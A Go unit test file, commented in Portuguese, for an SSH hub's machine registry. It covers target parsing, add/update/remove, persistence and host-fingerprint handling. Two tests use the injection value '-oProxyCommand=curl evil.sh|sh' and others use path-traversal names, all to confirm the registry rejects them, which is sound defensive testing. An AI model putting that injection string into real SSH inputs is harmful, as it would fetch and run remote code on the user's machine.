package machine

import (
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestParseSSHTargetsLeNomeEDestino(t *testing.T) {
	ms, warns := ParseSSHTargets("macbook=vx@192.0.2.20,macmini=remote-host")
	if len(warns) != 0 {
		t.Fatalf("avisos inesperados: %v", warns)
	}
	if len(ms) != 2 {
		t.Fatalf("esperava 2 máquinas, veio %d", len(ms))
	}
	if ms[0].Name != "macbook" || ms[0].Dest != "vx@192.0.2.20" {
		t.Errorf("primeira máquina errada: %+v", ms[0])
	}
	if ms[0].Source != SourceEnv {
		t.Errorf("máquina do env deve ter Source=env, veio %q", ms[0].Source)
	}
	if ms[0].Port != 22 {
		t.Errorf("porta default deve ser 22, veio %d", ms[0].Port)
	}
}

func TestParseSSHTargetsAceitaTerceiroCampoComoRemoteCmd(t *testing.T) {
	ms, _ := ParseSSHTargets("macbook=vx@192.0.2.20=/Users/vx/.local/bin/claude")
	if len(ms) != 1 {
		t.Fatalf("esperava 1 máquina, veio %d", len(ms))
	}
	if ms[0].RemoteCmd != "/Users/vx/.local/bin/claude" {
		t.Errorf("remoteCmd errado: %q", ms[0].RemoteCmd)
	}
}

// Uma entrada ruim não pode derrubar as boas — o hub precisa subir mesmo com
// CUTUQUE_SSH_TARGETS meio torto.
func TestParseSSHTargetsIgnoraEntradaMalformadaSemPerderAsBoas(t *testing.T) {
	ms, warns := ParseSSHTargets("bom=vx@host, ,semigual,=sem-nome,vazio=")
	if len(ms) != 1 || ms[0].Name != "bom" {
		t.Fatalf("esperava só a entrada boa, veio %+v", ms)
	}
	if len(warns) != 3 {
		t.Errorf("esperava 3 avisos (semigual, =sem-nome, vazio=), veio %d: %v", len(warns), warns)
	}
}

// Defesa herdada do review da F5: um destino começando com "-" seria
// reinterpretado pelo ssh como opção (ex.: -oProxyCommand=curl...). Injeção.
func TestParseSSHTargetsRejeitaDestinoQueParecOpcaoDoSSH(t *testing.T) {
	ms, warns := ParseSSHTargets("mal=-oProxyCommand=curl evil.sh|sh")
	if len(ms) != 0 {
		t.Errorf("destino começando com '-' deve ser recusado, veio %+v", ms)
	}
	if len(warns) != 1 {
		t.Errorf("esperava 1 aviso, veio %v", warns)
	}
}

// Formato amigável para copiar/colar no .env: espaço ao redor de nome e
// destino não pode quebrar o parse.
func TestParseSSHTargetsTiraEspacosAoRedor(t *testing.T) {
	ms, _ := ParseSSHTargets(" macbook = user@host , macmini = host2 ")
	if len(ms) != 2 {
		t.Fatalf("esperava 2 máquinas, veio %+v", ms)
	}
	if ms[0].Name != "macbook" || ms[0].Dest != "user@host" {
		t.Errorf("primeira entrada não teve os espaços tirados: %+v", ms[0])
	}
	if ms[1].Name != "macmini" || ms[1].Dest != "host2" {
		t.Errorf("segunda entrada não teve os espaços tirados: %+v", ms[1])
	}
}

func TestParseSSHTargetsVazioNaoEhErro(t *testing.T) {
	ms, warns := ParseSSHTargets("   ")
	if len(ms) != 0 || len(warns) != 0 {
		t.Errorf("entrada vazia deve dar nada e nenhum aviso: %+v / %v", ms, warns)
	}
}

func TestRegistryGetEListPreservamAOrdemDoEnv(t *testing.T) {
	r := NewRegistry([]Machine{
		{Name: "zulu", Dest: "a@b", Source: SourceEnv, Port: 22},
		{Name: "alfa", Dest: "c@d", Source: SourceEnv, Port: 22},
	})
	list := r.List()
	if len(list) != 2 || list[0].Name != "zulu" || list[1].Name != "alfa" {
		t.Errorf("List deve preservar a ordem do env, veio %+v", list)
	}
	m, ok := r.Get("alfa")
	if !ok || m.Dest != "c@d" {
		t.Errorf("Get(alfa) errado: %+v ok=%v", m, ok)
	}
	if _, ok := r.Get("naoexiste"); ok {
		t.Error("Get de máquina inexistente deve devolver ok=false")
	}
}

func TestNewRegistryPrimeiraOcorrenciaVence(t *testing.T) {
	r := NewRegistry([]Machine{
		{Name: "dup", Dest: "primeiro", Port: 22, Source: SourceEnv},
		{Name: "dup", Dest: "segundo", Port: 22, Source: SourceEnv},
	})
	if len(r.List()) != 1 {
		t.Fatalf("nome repetido deve entrar uma vez só: %+v", r.List())
	}
	if m, _ := r.Get("dup"); m.Dest != "primeiro" {
		t.Errorf("a primeira ocorrência deve vencer, veio %q", m.Dest)
	}
}

// MARK: cadastro pelo app (F3)

func TestAddCadastraMaquinaDoApp(t *testing.T) {
	r := NewRegistry(nil)
	m, err := r.Add(Machine{Name: "vps", Dest: "vx@203.0.113.9", Port: 2222})
	if err != nil {
		t.Fatalf("Add falhou: %v", err)
	}
	// Quem cadastra pelo app nunca escolhe a origem: é sempre app.
	if m.Source != SourceApp {
		t.Errorf("source = %q, esperava app", m.Source)
	}
	if got, ok := r.Get("vps"); !ok || got.Port != 2222 {
		t.Errorf("máquina não entrou no registro: %+v ok=%v", got, ok)
	}
}

// Porta 0 vira 22: o app pode mandar o campo vazio.
func TestAddSemPortaUsaAPadrao(t *testing.T) {
	r := NewRegistry(nil)
	m, _ := r.Add(Machine{Name: "vps", Dest: "vx@host"})
	if m.Port != defaultSSHPort {
		t.Errorf("porta = %d, esperava %d", m.Port, defaultSSHPort)
	}
}

func TestAddRecusaNomeRepetido(t *testing.T) {
	r := NewRegistry([]Machine{{Name: "macbook", Dest: "vx@host", Port: 22, Source: SourceEnv}})
	if _, err := r.Add(Machine{Name: "macbook", Dest: "outro@host"}); !errors.Is(err, ErrDuplicateName) {
		t.Errorf("err = %v, quero ErrDuplicateName", err)
	}
	if m, _ := r.Get("macbook"); m.Dest != "vx@host" {
		t.Errorf("o cadastro duplicado sobrescreveu a máquina do env: %+v", m)
	}
}

// O nome vai na URL e vira caminho de arquivo de chave. Barra, "..", espaço e
// vazio não podem passar: seriam path traversal ou rota quebrada.
func TestAddRecusaNomeInvalido(t *testing.T) {
	for _, nome := range []string{"", "  ", "a/b", "..", "../fuga", "com espaço", "a\tb"} {
		r := NewRegistry(nil)
		if _, err := r.Add(Machine{Name: nome, Dest: "vx@host"}); err == nil {
			t.Errorf("nome %q devia ser recusado", nome)
		}
	}
}

// Mesma defesa do ParseSSHTargets: dest com "-" na frente vira opção do ssh.
func TestAddRecusaDestQueParecOpcao(t *testing.T) {
	r := NewRegistry(nil)
	if _, err := r.Add(Machine{Name: "vps", Dest: "-oProxyCommand=curl evil.sh|sh"}); err == nil {
		t.Error("dest começando com '-' devia ser recusado")
	}
}

func TestAddRecusaDestVazio(t *testing.T) {
	r := NewRegistry(nil)
	if _, err := r.Add(Machine{Name: "vps", Dest: "   "}); err == nil {
		t.Error("dest vazio devia ser recusado")
	}
}

func TestUpdateAlteraDestEPorta(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Dest: "vx@antigo", Port: 22})
	m, err := r.Update("vps", Machine{Dest: "vx@novo", Port: 2222})
	if err != nil {
		t.Fatalf("Update falhou: %v", err)
	}
	if m.Dest != "vx@novo" || m.Port != 2222 {
		t.Errorf("update não pegou: %+v", m)
	}
}

// A chave e o fingerprint são do hub, não do app: um PATCH não pode trocá-los
// (seria aceitar outro host se passando pelo cadastrado).
func TestUpdateNaoDeixaTrocarChaveNemFingerprint(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Dest: "vx@host"})
	_ = r.SetKeyPath("vps", "/data/machines/keys/vps")
	_ = r.SetFingerprint("vps", "SHA256:original")

	_, err := r.Update("vps", Machine{
		Dest: "vx@host", KeyPath: "/etc/passwd", HostFingerprint: "SHA256:doAtacante",
	})
	if err != nil {
		t.Fatalf("Update falhou: %v", err)
	}
	m, _ := r.Get("vps")
	if m.KeyPath != "/data/machines/keys/vps" || m.HostFingerprint != "SHA256:original" {
		t.Errorf("chave/fingerprint foram trocados pelo PATCH: %+v", m)
	}
}

// O fingerprint pertence a um (dest, porta): apontar a máquina para outro host
// invalida a confirmação anterior. Mantê-lo faria o hub achar que já confiou
// num host que a usuária nunca conferiu.
func TestUpdateLimpaOFingerprintQuandoODestinoMuda(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Dest: "vx@antigo", Port: 22})
	_ = r.SetFingerprint("vps", "SHA256:doAntigo")

	m, err := r.Update("vps", Machine{Dest: "vx@outro", Port: 22})
	if err != nil {
		t.Fatalf("Update falhou: %v", err)
	}
	if m.HostFingerprint != "" {
		t.Errorf("fingerprint do host antigo sobreviveu à troca de destino: %q", m.HostFingerprint)
	}
}

// Porta diferente pode ser outro serviço (ou outro container) na mesma máquina:
// também exige reconfirmar.
func TestUpdateLimpaOFingerprintQuandoAPortaMuda(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Dest: "vx@host", Port: 22})
	_ = r.SetFingerprint("vps", "SHA256:na22")

	m, _ := r.Update("vps", Machine{Dest: "vx@host", Port: 2222})
	if m.HostFingerprint != "" {
		t.Errorf("fingerprint sobreviveu à troca de porta: %q", m.HostFingerprint)
	}
}

// A chave privada continua servindo o mesmo cadastro mesmo mudando o destino —
// só o fingerprint cai. Regerar a chave obrigaria a reinstalar no destino sem
// necessidade.
func TestUpdateNaoApagaAChaveAoMudarODestino(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "vps", Dest: "vx@antigo"})
	_ = r.SetKeyPath("vps", "/data/machines/keys/vps")

	m, _ := r.Update("vps", Machine{Dest: "vx@outro"})
	if m.KeyPath != "/data/machines/keys/vps" {
		t.Errorf("a chave foi perdida na troca de destino: %q", m.KeyPath)
	}
}

// Máquina do hub.env é read-only pelo app: quem manda nela é o env.
func TestUpdateERemoveRecusamMaquinaDoEnv(t *testing.T) {
	r := NewRegistry([]Machine{{Name: "macbook", Dest: "vx@host", Port: 22, Source: SourceEnv}})
	if _, err := r.Update("macbook", Machine{Dest: "outro@host"}); !errors.Is(err, ErrReadOnly) {
		t.Errorf("Update: err = %v, quero ErrReadOnly", err)
	}
	if err := r.Remove("macbook"); !errors.Is(err, ErrReadOnly) {
		t.Errorf("Remove: err = %v, quero ErrReadOnly", err)
	}
	if _, ok := r.Get("macbook"); !ok {
		t.Error("a máquina do env sumiu do registro")
	}
}

func TestUpdateERemoveDeMaquinaInexistente(t *testing.T) {
	r := NewRegistry(nil)
	if _, err := r.Update("fantasma", Machine{Dest: "x@y"}); !errors.Is(err, ErrNotFound) {
		t.Errorf("Update: err = %v, quero ErrNotFound", err)
	}
	if err := r.Remove("fantasma"); !errors.Is(err, ErrNotFound) {
		t.Errorf("Remove: err = %v, quero ErrNotFound", err)
	}
}

func TestRemoveTiraDaListaEDaOrdem(t *testing.T) {
	r := NewRegistry(nil)
	_, _ = r.Add(Machine{Name: "a", Dest: "vx@a"})
	_, _ = r.Add(Machine{Name: "b", Dest: "vx@b"})
	if err := r.Remove("a"); err != nil {
		t.Fatalf("Remove falhou: %v", err)
	}
	list := r.List()
	if len(list) != 1 || list[0].Name != "b" {
		t.Errorf("lista após remoção errada: %+v", list)
	}
}

// MARK: persistência

func TestRegistroSobreviveAoRestart(t *testing.T) {
	path := filepath.Join(t.TempDir(), "machines.json")

	r := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@env", Port: 22, Source: SourceEnv}})
	if _, err := r.Add(Machine{Name: "vps", Dest: "vx@203.0.113.9", Port: 2222}); err != nil {
		t.Fatalf("Add falhou: %v", err)
	}
	_ = r.SetFingerprint("vps", "SHA256:abc")

	// Restart: mesmo arquivo, mesmas máquinas do env.
	r2 := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@env", Port: 22, Source: SourceEnv}})
	m, ok := r2.Get("vps")
	if !ok {
		t.Fatal("a máquina cadastrada sumiu no restart")
	}
	if m.Port != 2222 || m.HostFingerprint != "SHA256:abc" || m.Source != SourceApp {
		t.Errorf("máquina voltou diferente: %+v", m)
	}
	if _, ok := r2.Get("macbook"); !ok {
		t.Error("a máquina do env sumiu depois de carregar o disco")
	}
}

// O env é a fonte da verdade das suas máquinas: se o disco tem uma antiga com o
// mesmo nome, o env vence — senão dava para "sequestrar" um nome do env
// cadastrando antes de ele existir.
func TestEnvVenceODiscoNoMesmoNome(t *testing.T) {
	path := filepath.Join(t.TempDir(), "machines.json")
	r := NewRegistryAt(path, nil)
	if _, err := r.Add(Machine{Name: "macbook", Dest: "vx@doAtacante"}); err != nil {
		t.Fatalf("Add falhou: %v", err)
	}

	r2 := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@doEnv", Port: 22, Source: SourceEnv}})
	m, _ := r2.Get("macbook")
	if m.Dest != "vx@doEnv" || m.Source != SourceEnv {
		t.Errorf("o disco sobrescreveu o env: %+v", m)
	}
}

// Remoção também tem que persistir: senão a máquina volta no restart.
func TestRemocaoPersiste(t *testing.T) {
	path := filepath.Join(t.TempDir(), "machines.json")
	r := NewRegistryAt(path, nil)
	_, _ = r.Add(Machine{Name: "vps", Dest: "vx@host"})
	if err := r.Remove("vps"); err != nil {
		t.Fatalf("Remove falhou: %v", err)
	}
	if _, ok := NewRegistryAt(path, nil).Get("vps"); ok {
		t.Error("a máquina removida voltou no restart")
	}
}

// Arquivo corrompido não pode derrubar o boot: o hub sobe com o que o env deu.
func TestDiscoCorrompidoNaoDerrubaOBoot(t *testing.T) {
	path := filepath.Join(t.TempDir(), "machines.json")
	if err := os.WriteFile(path, []byte("{isso não é json"), 0o600); err != nil {
		t.Fatal(err)
	}
	r := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@env", Port: 22, Source: SourceEnv}})
	if len(r.List()) != 1 {
		t.Errorf("esperava só a máquina do env: %+v", r.List())
	}
}

// Sem caminho (modo dev / teste) o registro funciona em memória.
func TestRegistroSemCaminhoNaoQuebra(t *testing.T) {
	r := NewRegistry(nil)
	if _, err := r.Add(Machine{Name: "vps", Dest: "vx@host"}); err != nil {
		t.Errorf("Add sem persistência devia funcionar: %v", err)
	}
}

// A chave privada mora em /data; o caminho dela é detalhe interno do hub e não
// pode ir para o app junto com o resto da máquina.
func TestKeyPathNaoVaiNoJSONDoApp(t *testing.T) {
	b, err := json.Marshal(Machine{Name: "vps", Dest: "vx@host", KeyPath: "/data/machines/keys/vps"})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(b), "keys/vps") {
		t.Errorf("o caminho da chave vazou no JSON: %s", b)
	}
}
